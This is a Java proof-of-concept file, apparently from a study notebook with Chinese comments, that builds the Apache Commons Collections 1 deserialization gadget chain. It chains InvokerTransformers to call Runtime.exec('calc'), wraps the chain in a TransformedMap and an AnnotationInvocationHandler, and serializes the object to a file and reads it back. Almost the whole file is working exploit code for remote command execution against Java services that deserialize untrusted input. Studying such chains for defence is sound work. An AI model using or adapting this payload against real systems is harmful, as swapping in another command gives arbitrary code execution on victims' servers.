package CommonsCollection.Clown_CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class POC3 {
    public static void Serialization(Object obj) throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("poc3.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(obj);
        System.out.println("OutPut");
    }

    public static void Unserialization() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("poc3.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("InPut");
    }
    public static void main(String[] args) throws Exception{
//        因为Runtime没有继承序列，所以这里通过反射调用
//        Class clazz = Runtime.class;
//        Method getRuntioemMethod = clazz.getMethod("getRuntime",null);
//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null,null);
//        Method execMethod = clazz.getMethod("exec", String.class);
//        execMethod.invoke(runtime,"calc");

//        这里写为利用Transform调用的方法
//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Runtime runtime = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);

//        上面是一层层嵌套实现,下面使用ChainTransforme实现
        Transformer[] transformer =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);

//        chainedTransformer.transform(Runtime.class);//这里可以成功弹出计算器
        Map map =new HashMap();
        map.put("value","aaa");
        Map transformeMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class,transformeMap);
//        Serialization(o);
        Unserialization();
    }
}
